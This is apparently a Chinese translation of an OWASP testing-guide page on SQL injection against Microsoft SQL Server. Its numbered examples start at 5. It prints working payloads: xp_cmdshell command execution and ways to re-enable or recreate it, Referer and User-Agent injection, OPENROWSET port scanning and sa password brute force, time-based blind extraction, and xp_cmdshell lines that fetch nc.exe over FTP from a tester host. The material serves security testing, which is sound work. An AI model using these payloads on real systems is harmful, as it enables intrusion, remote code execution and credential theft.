# 测试SQL Server

## 概述

本节将讨论一些利用Microsoft SQL Server特定功能的[SQL注入](https://owasp.org/www-community/attacks/SQL_Injection)技术。

SQL注入漏洞发生在输入用于构造SQL查询而没有充分约束或清理时。使用动态SQL（通过字符串连接构造SQL查询）为这些漏洞打开了大门。SQL注入允许攻击者访问SQL服务器，并在用于连接数据库的用户权限下执行SQL代码。

如[SQL注入](https://owasp.org/www-community/attacks/SQL_Injection)中所解释，SQL注入漏洞利用需要两件事：入口点和利用代码。任何由应用程序处理的用户控制参数都可能隐藏漏洞。这包括：

- 查询字符串中的应用程序参数（例如，GET请求）
- 作为POST请求正文一部分包含的应用程序参数
- 浏览器相关信息（例如user-agent、referrer）
- 主机相关信息（例如hostname、IP）
- 会话相关信息（例如user ID、cookies）

Microsoft SQL服务器有一些独特的特性，因此某些漏洞利用需要专门为此应用程序定制。

## 如何测试

### SQL Server特性

首先，让我们看看一些对SQL注入测试有用的SQL Server运算符和命令/存储过程：

- 注释运算符：`--`（用于强制查询忽略原始查询的剩余部分；在每个情况下都不是必需的）
- 查询分隔符：`;`（分号）
- 有用的存储过程包括：
  - [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql)使用与当前运行相同的权限执行任何命令shell。默认情况下，只允许`sysadmin`使用它，在SQL Server 2005中默认情况下它是禁用的（可以使用sp_configure重新启用）
  - `xp_regread`从注册表读取任意值（未记录的扩展过程）
  - `xp_regwrite`将任意值写入注册表（未记录的扩展过程）
  - [sp_makewebtask](https://docs.microsoft.com/en-us/previous-versions/sql/sql-server-2008/ms180099(v=sql.100))生成Windows命令shell并将字符串传递以执行。任何输出都作为文本行返回。它需要`sysadmin`特权。
  - [xp_sendmail](https://docs.microsoft.com/en-us/previous-versions/sql/sql-server-2008-r2/ms189505(v=sql.105))发送电子邮件消息，其中可能包括查询结果集附件。它使用SQL Mail发送消息。

现在让我们看看使用上述函数的特定SQL Server攻击的示例。大多数示例将使用`exec`函数。

下面我们展示如何执行shell命令，将命令`dir c:\inetpub`的输出写入可浏览文件，假设Web服务器和数据库服务器在同一主机上。以下语法使用`xp_cmdshell`：

`exec master.dbo.xp_cmdshell 'dir c:\inetpub > c:\inetpub\wwwroot\test.txt'--`

或者，我们可以使用`sp_makewebtask`：

`exec sp_makewebtask 'C:\Inetpub\wwwroot\test.txt', 'select * from master.dbo.sysobjects'--`

成功的执行将创建一个文件，测试人员可以浏览该文件。请记住`sp_makewebtask`已弃用，即使它在SQL Server 2005及之前的所有版本中都有效，它可能在将来被删除。

此外，SQL Server内置函数和环境变量非常方便。以下使用函数`db_name()`触发错误，该错误将返回数据库名称：

`/controlboard.asp?boardID=2&itemnum=1%20AND%201=CONVERT(int,%20db_name())`

请注意使用[convert](https://docs.microsoft.com/en-us/sql/t-sql/functions/cast-and-convert-transact-sql?view=sql-server-2017)：

`CONVERT ( data_type [ ( length ) ] , expression [ , style ] )`

`CONVERT`将尝试将`db_name`的结果（一个字符串）转换为整数变量，触发错误，如果易受攻击的应用程序显示该错误，该错误将包含数据库的名称。

以下示例结合了`union select`样式的注入来查找SQL Server版本的`@@version`环境变量：

`/form.asp?prop=33%20union%20select%201,2006-01-06,2007-01-06,1,'stat','name1','name2',2006-01-06,1,@@version%20--`

这是相同的攻击，但再次使用转换技巧：

`/controlboard.asp?boardID=2&itemnum=1%20AND%201=CONVERT(int,%20@@VERSION)`

信息收集有助于通过SQL注入攻击或直接访问SQL侦听器来利用SQL Server上的软件漏洞。

下面，我们展示了通过不同入口点利用SQL注入漏洞的多个示例。

### 示例5：自定义`xp_cmdshell`

所有描述SQL Server安全最佳实践的书籍和论文都建议在SQL Server 2000中禁用`xp_cmdshell`（在SQL Server 2005中默认情况下它是禁用的）。但是，如果我们有sysadmin权限（原生或通过暴力破解sysadmin密码，见下文），我们通常可以绕过此限制。

在SQL Server 2000上：

- 如果使用`sp_dropextendedproc`禁用了`xp_cmdshell`，我们可以简单地注入以下代码：

`sp_addextendedproc 'xp_cmdshell','xp_log70.dll'`

- 如果前面的代码不起作用，则意味着`xp_log70.dll`已被移动或删除。在这种情况下，我们需要注入以下代码：

```sql
CREATE PROCEDURE xp_cmdshell(@cmd varchar(255), @Wait int = 0) AS
    DECLARE @result int, @OLEResult int, @RunResult int
    DECLARE @ShellID int
    EXECUTE @OLEResult = sp_OACreate 'WScript.Shell', @ShellID OUT
    IF @OLEResult <> 0 SELECT @result = @OLEResult
    IF @OLEResult <> 0 RAISERROR ('CreateObject %0X', 14, 1, @OLEResult)
    EXECUTE @OLEResult = sp_OAMethod @ShellID, 'Run', Null, @cmd, 0, @Wait
    IF @OLEResult <> 0 SELECT @result = @OLEResult
    IF @OLEResult <> 0 RAISERROR ('Run %0X', 14, 1, @OLEResult)
    EXECUTE @OLEResult = sp_OADestroy @ShellID
    return @result
```

此代码（由Antonin Foller编写，请参阅页面底部的链接）使用`sp_oacreate`、`sp_oamethod`和`sp_oadestroy`创建新的`xp_cmdshell`（当然，只要它们没有被禁用）。使用它之前，我们需要删除我们创建的第一个`xp_cmdshell`（即使它不工作），否则两个声明会发生冲突。

在SQL Server 2005上，可以通过注入以下代码来启用`xp_cmdshell`：

```sql
master..sp_configure 'show advanced options',1
reconfigure
master..sp_configure 'xp_cmdshell',1
reconfigure
```

### 示例6：Referer / User-Agent

设置为以下内容的`REFERER`头：

`Referer: https://vulnerable.web.app/login.aspx', 'user_agent', 'some_ip'); [SQL CODE]--`

允许执行任意SQL代码。User-Agent头设置为相同：

`User-Agent: user_agent', 'some_ip'); [SQL CODE]--`

### 示例7：SQL Server作为端口扫描器

在SQL Server中，最有用（至少对渗透测试人员而言）的命令之一是OPENROWSET，它用于在另一个DB服务器上运行查询并检索结果。渗透测试人员可以使用此命令扫描目标网络上其他机器的端口，注入以下查询：

`select * from OPENROWSET('SQLOLEDB','uid=sa;pwd=foobar;Network=DBMSSOCN;Address=x.y.w.z,p;timeout=5','select 1')--`

此查询将尝试连接到地址x.y.w.z的端口p。如果端口关闭，将返回以下消息：

`SQL Server does not exist or access denied`

另一方面，如果端口打开，将返回以下错误之一：

`General network error. Check your network documentation`

`OLE DB provider 'sqloledb' reported an error. The provider did not give any information about the error.`

当然，错误消息并不总是可用。如果是这种情况，我们可以使用响应时间来理解发生了什么：对于关闭的端口，将消耗超时（此示例中为5秒），而对于打开的端口，将立即返回结果。

请记住，OPENROWSET在SQL Server 2000中默认启用，但在SQL Server 2005中被禁用。

### 示例8：上传可执行文件

一旦我们可以使用`xp_cmdshell`（原生的或自定义的），我们就可以轻松地将可执行文件上传到目标DB服务器。一个非常常见的选择是`netcat.exe`，但任何特洛伊木马都很有用。如果目标允许启动与测试人员机器的FTP连接，则只需注入以下查询：

```sql
exec master..xp_cmdshell 'echo open ftp.tester.org > ftpscript.txt';--
exec master..xp_cmdshell 'echo USER >> ftpscript.txt';--
exec master..xp_cmdshell 'echo PASS >> ftpscript.txt';--
exec master..xp_cmdshell 'echo bin >> ftpscript.txt';--
exec master..xp_cmdshell 'echo get nc.exe >> ftpscript.txt';--
exec master..xp_cmdshell 'echo quit >> ftpscript.txt';--
exec master..xp_cmdshell 'ftp -s:ftpscript.txt';--
```

此时，`nc.exe`将被上传并可用。

如果防火墙不允许FTP，我们有一种利用Windows调试器`debug.exe`的解决方法，该调试器默认安装在所有Windows计算机上。Debug.exe是可编写脚本的，能够通过执行适当的脚本文件来创建可执行文件。我们需要做的是将可执行文件转换为调试脚本（这是100% ASCII文件），逐行上传，最后对其进行调用。有几个工具可以创建此类调试文件（例如，Ollie Whitehouse的`makescr.exe`和`toolcrypt.org`的`dbgtool.exe`）。因此，注入的查询如下：

```sql
exec master..xp_cmdshell 'echo [debug script line #1 of n] > debugscript.txt';--
exec master..xp_cmdshell 'echo [debug script line #2 of n] >> debugscript.txt';--
....
exec master..xp_cmdshell 'echo [debug script line #n of n] >> debugscript.txt';--
exec master..xp_cmdshell 'debug.exe < debugscript.txt';--
```

此时，我们的可执行文件在目标机器上可用，可以执行。有工具可以自动化此过程，最值得注意的是在Windows上运行的Bobcat和在Unix上运行的Sqlninja（请参阅本页底部的工具）。

### 在未显示信息时获取信息（带外）

当Web应用程序不返回任何信息时，并非一切都会丢失——例如描述性错误消息（参见[盲SQL注入](https://owasp.org/www-community/attacks/Blind_SQL_Injection)）。例如，可能您可以访问源代码（例如，因为Web应用程序基于开源软件）。然后，测试人员可以离线利用在Web应用程序中发现的所有SQL注入漏洞进行利用。尽管IPS可能会阻止其中一些攻击，但最好的方法是：在专门为此目的创建的测试台上开发和测试攻击，然后对这些攻击进行测试。针对目标Web应用程序的实际测试完成后，可以开发并测试这些攻击。

其他带外攻击选项在[上面的示例4](#example-4-yet-another-useful-get-example)中描述。

### 盲SQL注入攻击

#### 试错

或者，一个人可能很幸运。也就是说，攻击者可能假设Web应用程序中存在盲或带外SQL注入漏洞。然后，他将选择一个攻击向量（例如，Web入口），[对该通道使用模糊向量](../../6-Appendix/C-Fuzz_Vectors.md)并观察响应。例如，如果Web应用程序使用查询查找书籍

```sql
select * from books where title="text entered by the user"
```

然后渗透测试人员可能输入文本：`'Bomba' OR 1=1-`，如果数据未正确验证，查询将通过并返回整个书籍列表。这是存在SQL注入漏洞的证据。渗透测试人员稍后可以"玩"查询以评估此漏洞的严重性。

> **_注意：_**  在SQL查询中注入条件OR 1=1时要小心。虽然在您注入的初始上下文中这可能是无害的，但应用程序通常在多个不同的查询中使用单个请求中的数据。例如，如果您的条件到达UPDATE或DELETE语句，可能导致意外的数据丢失。

#### 如果显示多个错误消息

另一方面，如果没有先验信息可用，通过利用任何`隐蔽通道`仍然存在攻击的可能性。描述性错误消息可能已被阻止，但错误消息仍会提供一些信息。例如：

- 在某些情况下，Web应用程序（实际上是Web服务器）可能返回传统的`500: Internal Server Error`，例如当应用程序返回可能由带有未闭合引号的查询生成的异常时。
- 在其他情况下，服务器将返回`200 OK`消息，但Web应用程序将返回一些开发人员插入的错误消息`Internal server error`或`bad data`。

这一点信息可能足以理解Web应用程序如何构造动态SQL查询并调整利用方式。另一种带外方法是通过HTTP浏览文件输出结果。

#### 时序攻击

当应用程序没有可见反馈时，还有另一种进行盲SQL注入攻击的可能性：通过测量Web应用程序响应请求所花费的时间。[Anley](https://web.archive.org/web/20160413052024/https://www.encription.co.uk/downloads/more_advanced_sql_injection.pdf)描述了这种攻击，下面我们从中获取示例。一种典型方法使用`waitfor delay`命令：假设攻击者想要检查`pubs`示例数据库是否存在，他将简单注入以下命令：

`if exists (select * from pubs..pub_info) waitfor delay '0:0:5'`

根据查询返回所需的时间，我们将知道答案。实际上，我们这里有两样东西：一个`SQL注入漏洞`和一个`隐蔽通道`，允许渗透测试人员每次查询获取1位信息。因此，使用多次查询（所需信息的位数一样多），测试人员可以获取数据库中的任何数据。看下面的查询

```sql
declare @s varchar(8000)
declare @i int
select @s = db_name()
select @i = [some value]
if (select len(@s)) < @i waitfor delay '0:0:5'
```

通过测量响应时间并使用`@i`的不同值，我们可以推断当前数据库名称的长度，然后使用以下查询开始提取名称本身：

`if (ascii(substring(@s, @byte, 1)) & ( power(2, @bit))) > 0 waitfor delay '0:0:5'`

如果当前数据库名称的`@bit`字节的`@byte`是1，此查询将等待5秒；如果为0，则立即返回。通过嵌套两个循环（一个用于`@byte`，一个用于`@bit`），我们将能够提取整个信息。

但是，可能`waitfor`命令不可用（例如，因为它被IPS/Web应用程序防火墙过滤）。这并不意味着不能进行盲SQL注入攻击，因为测试人员应该只能提出任何未过滤的耗时的操作。例如：

```sql
declare @i int select @i = 0
while @i < 0xaffff begin
select @i = @i + 1
end
```

#### 检查版本和漏洞

相同的时间方法也可用于了解我们正在处理的SQL Server版本。当然，我们将利用内置的`@@version`变量。考虑以下查询：

`select @@version`

在SQL Server 2005上，它将返回类似以下内容：

`Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86) Oct 14 2005 00:33:37`

字符串的`2005`部分从第22个字符到第25个字符。因此，可以注入以下查询：

`if substring((select @@version),25,1) = 5 waitfor delay '0:0:5'`

如果`@@version`变量的第25个字符是`5`，则此查询将等待5秒，表明我们正在处理SQL Server 2005。如果查询立即返回，我们可能正在处理SQL Server 2000，另一个类似的查询将帮助消除所有疑问。

### 示例9：暴力破解Sysadmin密码

为了暴力破解sysadmin密码，我们可以利用OPENROWSET需要正确凭据才能成功连接以及此类连接也可以"循环"到本地DB服务器这一事实。将这些特性与基于响应时序的推理注入攻击相结合，我们可以注入以下代码：

`select * from OPENROWSET('SQLOLEDB','';'sa';'<pwd>','select 1;waitfor delay ''0:0:5'' ')`

我们在这里做的是尝试使用`sa`和`<pwd>`作为凭据连接到本地数据库（由`SQLOLEDB`之后的空字段指定）。如果密码正确且连接成功，则执行查询，使数据库等待5秒（并且还返回一个值，因为OPENROWSET期望至少一列）。从词汇表中获取候选密码并测量每个连接所需的时间，我们可以尝试猜测正确的密码。在"使用SQL注入和推理进行数据挖掘"中，David Litchfield进一步推动了这一技术，通过注入一段代码，使用DB服务器本身的CPU资源来暴力破解sysadmin密码。

一旦我们有了sysadmin密码，我们就有两种选择：

- 使用`OPENROWSET`注入所有后续查询，以使用sysadmin权限
- 使用`sp_addsrvrolemember`将当前用户添加到sysadmin组。可以使用推理注入针对变量`system_user`提取当前用户名。

请记住，在SQL Server 2000上，所有用户都可以访问OPENROWSET，但在SQL Server 2005上，它仅限于管理帐户。
